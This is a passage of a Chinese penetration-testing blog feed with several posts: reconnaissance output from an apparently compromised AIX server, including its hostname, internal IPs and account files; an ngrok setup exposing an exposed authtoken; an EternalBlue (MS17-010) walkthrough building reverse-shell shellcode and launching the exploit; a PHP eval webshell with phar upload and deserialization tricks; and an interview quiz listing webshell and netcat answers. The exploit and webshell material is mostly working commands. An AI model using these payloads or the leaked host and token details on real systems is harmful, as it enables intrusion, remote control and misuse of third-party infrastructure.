class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[/]$ prtconf</span><br><span class="line">System Model: IBM,9119-FHA</span><br><span class="line">Machine Serial Number: 83081F5</span><br><span class="line">Processor Type: PowerPC_POWER6</span><br><span class="line">Processor Implementation Mode: POWER 6</span><br><span class="line">Processor Version: PV_6_Compat</span><br><span class="line">Number Of Processors: 2</span><br><span class="line">Processor Clock Speed: 5000 MHz</span><br><span class="line">CPU Type: 64-bit</span><br><span class="line">Kernel Type: 64-bit</span><br><span class="line">LPAR Info: 13 RAFIKI</span><br><span class="line">Memory Size: 6144 MB</span><br><span class="line">Good Memory Size: 6144 MB</span><br><span class="line">Platform Firmware level: EH350_176</span><br><span class="line">Firmware Version: IBM,EH350_176</span><br><span class="line">Console Login: enable</span><br><span class="line">Auto Restart: true</span><br><span class="line">Full Core: false</span><br><span class="line"> </span><br><span class="line">Network Information</span><br><span class="line">Host Name: rafiki.cma.junta-andalucia.es</span><br><span class="line">IP Address: 10.229.36.67</span><br><span class="line">Sub Netmask: 255.255.252.0</span><br><span class="line">Gateway: 10.229.39.7</span><br><span class="line">Name Server: 10.229.36.2</span><br><span class="line">Domain Name: cma.junta-andalucia.es</span><br><span class="line"> </span><br><span class="line">Paging Space Information</span><br><span class="line">Total Paging Space: 4096MB</span><br><span class="line">Percent Used: 1%</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[/]$ id</span><br><span class="line">uid=204(aplica) gid=202(aplica) groups=1(staff)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[/]$ cat /etc/passwd</span><br><span class="line">root:!:0:0::/:/usr/bin/ksh</span><br><span class="line">daemon:!:1:1::/etc:</span><br><span class="line">bin:!:2:2::/bin:</span><br><span class="line">sys:!:3:3::/usr/sys:</span><br><span class="line">adm:!:4:4::/var/adm:</span><br><span class="line">uucp:!:5:5::/usr/lib/uucp:</span><br><span class="line">guest:!:100:100::/home/guest:</span><br><span class="line">nobody:!:4294967294:4294967294::/:</span><br><span class="line">lpd:!:9:4294967294::/:</span><br><span class="line">lp:*:11:11::/var/spool/lp:/bin/false</span><br><span class="line">invscout:!:6:12::/var/adm/invscout:/usr/bin/ksh</span><br><span class="line">ipsec:*:200:1::/etc/ipsec:/usr/bin/ksh</span><br><span class="line">esaadmin:*:7:0::/var/esa:/usr/bin/ksh</span><br><span class="line">pconsole:*:8:0::/var/adm/pconsole:/usr/bin/ksh</span><br><span class="line">snapp:*:201:14:snapp login user:/usr/sbin/snapp:/usr/sbin/snappd</span><br><span class="line">nuucp:*:10:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucico</span><br><span class="line">sshd:*:202:201::/var/empty:/usr/bin/ksh</span><br><span class="line">monitor:!:203:1::/home/monitor:/usr/bin/ksh</span><br><span class="line">aplica:!:204:202:Usuario para Tomcats:/home/aplica:/usr/bin/ksh</span><br><span class="line">fujitsu:!:205:1::/home/fujitsu:/usr/bin/ksh</span><br><span class="line">rim:!:206:1::/home/rim:/usr/bin/ksh</span><br><span class="line">vrl:!:207:1::/home/vrl:/usr/bin/ksh</span><br><span class="line">dhr:!:208:1::/home/dhr:/usr/bin/ksh</span><br><span class="line">jrg:!:209:1::/home/jrg:/usr/bin/ksh</span><br><span class="line">mhr:!:210:1::/home/mhr:/usr/bin/ksh</span><br><span class="line">atc:!:211:1::/home/atc:/usr/bin/ksh</span><br><span class="line">mjvp:!:212:1::/home/mjvp:/usr/bin/ksh</span><br><span class="line">egmasa:!:10003:1::/home/egmasa:/usr/bin/ksh</span><br><span class="line">lec-hsm:!:10004:1::/home/lec-hsm:/usr/bin/ksh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[/]$ cat /etc/group</span><br><span class="line">system:!:0:root,esaadmin,pconsole</span><br><span class="line">staff:!:1:ipsec,esaadmin,sshd,monitor,aplica,rim,vrl,dhr,jrg,mhr,atc,mjvp,egmasa,lec-hsm</span><br><span class="line">bin:!:2:root,bin</span><br><span class="line">sys:!:3:root,bin,sys</span><br><span class="line">adm:!:4:bin,adm</span><br><span class="line">uucp:!:5:uucp,nuucp</span><br><span class="line">mail:!:6:</span><br><span class="line">security:!:7:root</span><br><span class="line">cron:!:8:root</span><br><span class="line">printq:!:9:lp</span><br><span class="line">audit:!:10:root</span><br><span class="line">ecs:!:28:</span><br><span class="line">nobody:!:4294967294:nobody,lpd</span><br><span class="line">usr:!:100:guest</span><br><span class="line">perf:!:20:</span><br><span class="line">shutdown:!:21:</span><br><span class="line">lp:!:11:root,lp</span><br><span class="line">invscout:!:12:invscout</span><br><span class="line">ipsec:!:200:</span><br><span class="line">pconsole:!:13:pconsole</span><br><span class="line">snapp:!:14:snapp</span><br><span class="line">sshd:!:201:sshd</span><br><span class="line">aplica:!:202:aplica</span><br><span class="line">adminaix:!:203:rim,fujitsu,vrl,dhr,jrg,mhr,atc,mjvp</span><br><span class="line">egmasa:!:10003:egmasa,lec-hsm</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[/]$ lsgroup ALL</span><br><span class="line">system id=0 admin=true users=root,esaadmin,pconsole registry=files </span><br><span class="line">staff id=1 admin=false users=ipsec,esaadmin,sshd,monitor,aplica,rim,vrl,dhr,jrg,mhr,atc,mjvp,egmasa,lec-hsm,daemon,fujitsu registry=files </span><br><span class="line">bin id=2 admin=true users=root,bin registry=files </span><br><span class="line">sys id=3 admin=true users=root,bin,sys registry=files </span><br><span class="line">adm id=4 admin=true users=bin,adm registry=files </span><br><span class="line">uucp id=5 admin=true users=uucp,nuucp registry=files </span><br><span class="line">mail id=6 admin=true users= registry=files </span><br><span class="line">security id=7 admin=true users=root registry=files </span><br><span class="line">cron id=8 admin=true users=root registry=files </span><br><span class="line">printq id=9 admin=true users=lp registry=files </span><br><span class="line">audit id=10 admin=true users=root registry=files </span><br><span class="line">ecs id=28 admin=true users= registry=files </span><br><span class="line">nobody id=4294967294 admin=false users=nobody,lpd registry=files </span><br><span class="line">usr id=100 admin=false users=guest registry=files </span><br><span class="line">perf id=20 admin=false users= registry=files </span><br><span class="line">shutdown id=21 admin=true users= registry=files </span><br><span class="line">lp id=11 admin=true users=root,lp registry=files </span><br><span class="line">invscout id=12 admin=true users=invscout registry=files </span><br><span class="line">ipsec id=200 admin=false users= registry=files </span><br><span class="line">pconsole id=13 admin=true users=pconsole registry=files </span><br><span class="line">snapp id=14 admin=true users=snapp registry=files </span><br><span class="line">sshd id=201 admin=false users=sshd registry=files </span><br><span class="line">aplica id=202 admin=false users=aplica adms=root registry=files </span><br><span class="line">adminaix id=203 admin=false users=rim,fujitsu,vrl,dhr,jrg,mhr,atc,mjvp adms=root registry=files </span><br><span class="line">egmasa id=10003 admin=false users=egmasa,lec-hsm adms=root registry=files</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[/]$ ifconfig -a</span><br><span class="line">en2: flags=1e084863,480&lt;UP,BROADCAST,NOTRAILERS,RUNNING,SIMPLEX,MULTICAST,GROUPRT,64BIT,CHECKSUM_OFFLOAD(ACTIVE),CHAIN&gt;</span><br><span class="line">inet 10.229.36.67 netmask 0xfffffc00 broadcast 10.229.39.255</span><br><span class="line"> tcp_sendspace 262144 tcp_recvspace 262144 rfc1323 1</span><br><span class="line">lo0: flags=e08084b,c0&lt;UP,BROADCAST,LOOPBACK,RUNNING,SIMPLEX,MULTICAST,GROUPRT,64BIT,LARGESEND,CHAIN&gt;</span><br><span class="line">inet 127.0.0.1 netmask 0xff000000 broadcast 127.255.255.255</span><br><span class="line">inet6 ::1%1/0</span><br><span class="line"> tcp_sendspace 131072 tcp_recvspace 131072 rfc1323 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[/]$ ps aux</span><br><span class="line">USER          PID %CPU %MEM   SZ  RSS    TTY STAT    STIME  TIME COMMAND</span><br><span class="line">aplica   23330932  0.1  3.0 169768 169820      - A    02:00:08  1:40 /usr/java6_64/</span><br><span class="line">root       131076  0.0  0.0  448  448      - A      Jan 09 975:43 wait</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[/]$ who -p /var/adm/wtmp</span><br><span class="line">ha_star         .       Jan 18 11:46     0:40  23068700 id=ha_star</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.anquanke.com/post/id/85924" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85924</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;一句话连接上去发现是我没遇到过的操作系统（AIX），记录一下学习过程&lt;/p&gt;
&lt;h2 id=&quot;查看内核&quot;&gt;&lt;a href=&quot;#查看内核&quot; c
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>内网kali映射到公网</title>
    <link href="txf7.xyz/2019/01/08/kaligongwang/"/>
    <id>txf7.xyz/2019/01/08/kaligongwang/</id>
    <published>2019-01-08T04:21:05.000Z</published>
    <updated>2019-01-08T04:22:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><blockquote><p>Gate one是一款基于HTML5的开源终端模拟器/SSH客户端，同时内置强大的插件功能。它自带的插件使其成为一款令人惊艳的SSH客户端，但是，它可以用于运行任何终端应用。用户可以将GateOne嵌入其他应用程序从而提供各类终端访问界面，它也支持各类基于Web的管理界面。</p></blockquote><blockquote><p>ngrok 一款类似内网转发实现穿透工具，类似于花生壳，在本实验中就是把内网中web端的kali映射到公网，通过公网访问特定的域名就能登录到内网中的kali，去进行操作,效果图，那个网址就是本地映射端口80映射出去地址。</p></blockquote><h2 id="Gate-one配置"><a href="#Gate-one配置" class="headerlink" title="Gate one配置"></a>Gate one配置</h2><p>1、<a href="https://github.com/liftoff/GateOne" target="_blank" rel="noopener">https://github.com/liftoff/GateOne</a><br>2、解压GateOne-master.zip<br>3、unzip GateOne-master.zip （如果没有unzip命令 ;apt-get install unzip安装）<br>4、进入当前文件夹 cd GateOne-master<br>5、python ./setup.py install 进行安装</p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/bin/gateone</span><br><span class="line">./gateone</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-235ab4eb7b17bfbd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="出现报错"><br><strong>解决方法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tornado==4.5.3</span><br></pre></td></tr></table></figure></p><h2 id="备份配置文件"><a href="#备份配置文件" class="headerlink" title="备份配置文件"></a>备份配置文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp 10server.conf  10server.conf_bak</span><br></pre></td></tr></table></figure><h2 id="关闭ssl"><a href="#关闭ssl" class="headerlink" title="关闭ssl"></a>关闭ssl</h2><p>更改配置文件”disable_ssl”: true</p><p>##重启服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chomd 777 /etc/init.d/gateone</span><br><span class="line">/etc/init.d/gateone restart</span><br></pre></td></tr></table></figure></p><h2 id="web界面"><a href="#web界面" class="headerlink" title="web界面"></a>web界面</h2><p>192.168.2.110:443</p><h2 id="Ngrok配置"><a href="#Ngrok配置" class="headerlink" title="Ngrok配置"></a>Ngrok配置</h2><p>下载地址:<a href="https://ngrok.com/download" target="_blank" rel="noopener">https://ngrok.com/download</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok authtoken 4o8PGRfq3xMVvov81NxZc_2mpUWWbpLk4nugrrWHNx9</span><br></pre></td></tr></table></figure></p><blockquote><p>Authtoken saved to configuration file: /root/.ngrok2/ngrok.yml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok http 443</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h2><p><img src="https://upload-images.jianshu.io/upload_images/14134003-6b0c4ca56eb4b1c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;headerlink&quot; title=&quot;工具&quot;&gt;&lt;/a&gt;工具&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Gate one是一款基于HTML5的开源终端模拟器/SSH客户端，同时内置强大的插件功能。它自带的插件使其成为一
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>ms17-010(windows2012)</title>
    <link href="txf7.xyz/2019/01/07/ms17-010/"/>
    <id>txf7.xyz/2019/01/07/ms17-010/</id>
    <published>2019-01-07T06:04:45.000Z</published>
    <updated>2019-01-07T12:25:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：192.168.2.110   &gt; kali<br>靶机：192.168.2.112    &gt; windows2012 R2 64(启用了Guest)</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>• NASM - <a href="http://www.nasm.us/" target="_blank" rel="noopener">http://www.nasm.us/</a><br>• Python v2.7 - <a href="https://www.python.org/download/releases/2.7/" target="_blank" rel="noopener">https://www.python.org/download/releases/2.7/</a><br>• Metasploit Framework - <a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1.从以下链接可以获得由Sleepya开发的内核shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure></p><p>2.我们使用以下命令来保存.asm文件，并使用NASM来编译，其命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure></p><p>3.TCP生成反向shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell/reverse_tcp -f raw -o shell_msf.bin EXITFUNC=thread LHOST=192.168.2.110 lPORT=4444</span><br></pre></td></tr></table></figure></p><p>4.Shellcode前加上eternalblue内核，形成新的攻击载荷<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eternalblue_kshellcode_x64 shell_msf.bin &gt; reverse_shell.bin</span><br></pre></td></tr></table></figure></p><p>5.下载漏洞利用的python程序（windows server 2012）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/worawit/MS17-010/master/eternalblue_exploit8.py</span><br></pre></td></tr></table></figure></p><p>6.msf开启监听</p><blockquote><p>use exploit/multi/handler<br>set payload windows/x64/meterpreter/reverse_tcp<br>set LHOST 192.168.2.110<br>set LPORT 4444<br>exploit</p></blockquote><p>7.修改eternalblue_exploit8.py中的以下代码，设置登陆信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Windows 2012 does not allow anonymous to login if no share is accessible.</span><br><span class="line">USERNAME=&apos;Guest&apos;</span><br><span class="line">PASSWORD=&apos;&apos;</span><br></pre></td></tr></table></figure></p><p>8.运行eternalblue_exploit8.py，执行以下代码，启动攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python eternalblue_exploit8.py 192.168.2.112 reverse_shell.bin 500</span><br></pre></td></tr></table></figure></p><p>9.在metaspoilt上得到反弹结果，得到Windows的控制<br><img src="https://upload-images.jianshu.io/upload_images/14134003-95d70f80e41acf67.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;攻击机：192.168.2.110   &amp;gt; kali&lt;br&gt;靶机：192.168.2.112    &amp;gt; windows2012 
      
    
    </summary>
    
      <category term="漏洞利用" scheme="txf7.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计思路</title>
    <link href="txf7.xyz/2019/01/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/"/>
    <id>txf7.xyz/2019/01/01/代码审计思路/</id>
    <published>2019-01-01T02:03:47.000Z</published>
    <updated>2019-03-21T07:48:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h2><h4 id="敏感函数回溯参数过程"><a href="#敏感函数回溯参数过程" class="headerlink" title="敏感函数回溯参数过程"></a>敏感函数回溯参数过程</h4><p>根据敏感函数来逆向追踪参数的传递过程，是目前使用的最多的一种方式。</p><h4 id="通读全文代码"><a href="#通读全文代码" class="headerlink" title="通读全文代码"></a>通读全文代码</h4><p>首先是看程序的大体代码结构，主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件。</p><h4 id="根据功能点定向审计"><a href="#根据功能点定向审计" class="headerlink" title="根据功能点定向审计"></a>根据功能点定向审计</h4><p>在熟悉了审计之后，就会知道哪些功能点通常会有漏洞，然后根据可能出现漏洞的地方开始审计，可以提高效率。</p><p><img src="https://images2017.cnblogs.com/blog/1062851/201710/1062851-20171031211339873-764826001.png" alt="思维导图"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;代码审计思路&quot;&gt;&lt;a href=&quot;#代码审计思路&quot; class=&quot;headerlink&quot; title=&quot;代码审计思路&quot;&gt;&lt;/a&gt;代码审计思路&lt;/h2&gt;&lt;h4 id=&quot;敏感函数回溯参数过程&quot;&gt;&lt;a href=&quot;#敏感函数回溯参数过程&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="代码审计" scheme="txf7.xyz/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>phar利用姿势</title>
    <link href="txf7.xyz/2018/12/25/phar/"/>
    <id>txf7.xyz/2018/12/25/phar/</id>
    <published>2018-12-25T03:01:04.000Z</published>
    <updated>2018-12-25T06:36:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Phar绕过上传"><a href="#Phar绕过上传" class="headerlink" title="Phar绕过上传"></a>Phar绕过上传</h2><blockquote><p>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><p>压缩后改后缀名为jpg</p><blockquote><p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&apos;phar://./test.jpg/test.php&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="Phar反序列化漏洞"><a href="#Phar反序列化漏洞" class="headerlink" title="Phar反序列化漏洞"></a>Phar反序列化漏洞</h2><blockquote><p>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $test=&quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(&quot;test.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new Test();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    $phar-&gt;stopBuffering();    //签名自动计算</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="执行后生成test-phar"><a href="#执行后生成test-phar" class="headerlink" title="执行后生成test.phar"></a>执行后生成test.phar</h4><p><img src="https://upload-images.jianshu.io/upload_images/14134003-a852a42b11abe7d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="test.phar"></p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><blockquote><p>eval.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo &quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_get_contents(&quot;phar://./test.phar/test.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/14134003-f78014e27d966956.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="eval.php"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Phar绕过上传&quot;&gt;&lt;a href=&quot;#Phar绕过上传&quot; class=&quot;headerlink&quot; title=&quot;Phar绕过上传&quot;&gt;&lt;/a&gt;Phar绕过上传&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;test.php&lt;br&gt;&lt;figure class=&quot;highli
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>web渗透面试</title>
    <link href="txf7.xyz/2018/12/24/%E9%9D%A2%E8%AF%95/"/>
    <id>txf7.xyz/2018/12/24/面试/</id>
    <published>2018-12-24T02:03:47.000Z</published>
    <updated>2019-01-11T12:46:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试笔试题"><a href="#渗透测试笔试题" class="headerlink" title="渗透测试笔试题"></a>渗透测试笔试题</h2><h4 id="填空题"><a href="#填空题" class="headerlink" title="填空题"></a>填空题</h4><p>1.12345的二进制是()<br>2.目前常用的HTTP版本是()<br>3.Burpsuite是用什么语言编写的()<br>4.Sqlmap工具中-D参数是什么意思()<br>5.Tomcat通过部署()得到webshell<br>6.请写出任意一个常见的一句话木马webshell()<br>7.Nc监听本地TCP1234端口的命令是()<br>8.Cmd命令行查看系统是否有隐藏用户的命令是()<br>9.Mysql查询当前用户名的关键字(函数)为()()<br>10.Postgresql、GlassFish、redis、snmp默认端口分别是()()()()<br>11.PHP远程包含需要开启()选项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">8进制转2进制或者10进制转2进制（除2得余）</span><br><span class="line">HTTP 1.1</span><br><span class="line">JAVA</span><br><span class="line">指定数据库</span><br><span class="line">war包</span><br><span class="line">&lt;?php @_POST[&apos;cmd&apos;]?&gt;</span><br><span class="line">nc -l -p 1234</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users /s</span><br><span class="line">select user()</span><br><span class="line">5432 4848 6753 161</span><br><span class="line">allow_url_include</span><br></pre></td></tr></table></figure></p><h4 id="解答题"><a href="#解答题" class="headerlink" title="解答题"></a>解答题</h4><ol><li>说说常见的中间件解析漏洞利用方式</li><li>CMD命令行如何查询远程终端开放端口</li><li>服务器为IIS+PHP+MySQL，发现root权限注入漏洞，讲讲你的渗透思路</li><li>说出XSS的三种类型，且在过滤”&lt;&gt;”号下如何绕过</li><li>PHP开启magic_quotes_gpc选项或使用addslashes()函数后，还可以注入吗</li><li>请写出Mysql5数据库中查询库’helloworld’中’users’表所有列名的语句</li><li>下面这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利用<br><a href="http://www.exp.com/1.php" target="_blank" rel="noopener">http://www.exp.com/1.php</a><br>&lt;?php<br>$s_func = $_GET[‘s_func’];<br>$info = $_GET[‘info’];<br>$s_func($info);<br>?&gt;<br>8.如何绕过CDN获取目标网站真实IP，谈谈你的思路？<br>9.谈一谈Windows系统与Linux系统提权的思路？<br>10.已知服务器环境为Tomcat+Linux，网站存在上传漏洞，可以上传JSP木马程序，但无法找到路径（格式为：<a href="http://www.exp.com/down.action?file=test.jsp），" target="_blank" rel="noopener">http://www.exp.com/down.action?file=test.jsp），</a> 